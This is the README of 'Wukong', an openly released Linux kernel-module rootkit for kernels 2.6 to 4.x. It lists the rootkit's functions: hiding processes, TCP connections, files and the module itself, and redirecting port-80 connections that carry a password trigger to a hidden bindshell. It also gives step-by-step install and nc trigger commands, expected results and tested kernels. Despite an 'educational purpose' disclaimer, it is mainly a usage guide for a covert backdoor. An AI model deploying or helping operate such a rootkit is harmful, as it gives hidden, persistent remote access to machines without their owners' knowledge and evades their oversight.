# Wukong: a LKM rootkit for Linux kernel 2.6.x, 3.x and 4.x
The idea of wukong is from a comercail Linux Backdoor software, designed for a hacking team in early 2015 for legal using. Now for educational perpose, I will release an open source version. <strong>Please call me good man.</strong><br />
<br />
<h2>
	<span style="color:#E53333;">Note:</span>
</h2>
<span style="color:#E53333;"><strong>This kernel rootkit is just for educational purpose and it shouldn't be used for any illegal activities, use this at your own risk.</strong></span><br />
<br />
<br />
<br />
<h2>
	Function
</h2>
1. Hide Linux Process.<br />
2. Hide TCP connection.<br />
3. Hide File/Directory.<br />
4. Hide wukong.ko.<br />
5. Redirect TCP connection to backdoor server by using the specific confidential password.<br />
<br />
<h2>
	Usage
</h2>
1. Environment:<br />
ubunt-14.04 (1.1.1.33) --- (1.1.1.1)ubunt-14.04 &nbsp;<br />
(client)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (server)<br />
<br />
2. Test step:<br />
a. on server<br />
cd wukong/<br />
sudo ./install.pl<br />
sudo nc -k -l 80<br />
<br />
b. on client<br />
nc 1.1.1.1 80<br />
http<br />
ifconfig<br />
PS：The connection will be redirected to bindshell<br />
<br />
nc 1.1.1.1 80<br />
111111<br />
PS: a rst will be received.<br />
<br />
nc 1.1.1.1 80<br />
111111<br />
aaaaaa<br />
PS: The connection will be connected with tcp 80.<br />
<br />
3. Result:<br />
a. Bindshell file is hidden.<br />
b. Tcp 8000 connection is hidden.<br />
c. Bindshell process is hidden<br />
c. wukong.ko is hidden<br />
e. If "http" is the first four bytes to TCP 80, connection will be established with bindshell.<br />
<br />
<br />
<h2>
	Tested OS:
</h2>
CentOS-5.5-i386-bin-DVD.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 2.6.18-408.el5 #1 SMP Tue Jan 19 09:13:33 EST 2016 i686 i686 i386 GNU/Linux<br />
CentOS-5.5-x86_64-bin-DVD<br />
&nbsp;&nbsp;&nbsp; Linux 2.6.18-194.el5 #1 SMP Fri Apr 2 14:58:14 EDT 2010 x86_64 x86_64 x86_64 GNU/Linux<br />
ubuntu-14.04.2-desktop-i386.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux<br />
ubuntu-14.04.2-desktop-amd64.iso&nbsp; &nbsp;<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:43:14 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux<br />
ubuntu-14.04.3-desktop-i386.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux<br />
ubuntu-14.04.3-desktop-amd64.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux<br />
<br />
<br />
<h2>
	ToDo:
</h2>
&nbsp;&nbsp;&nbsp; Do performance tuning, make it can work on Linux server with large traffic.<br />
&nbsp;&nbsp;&nbsp; Adding more features.
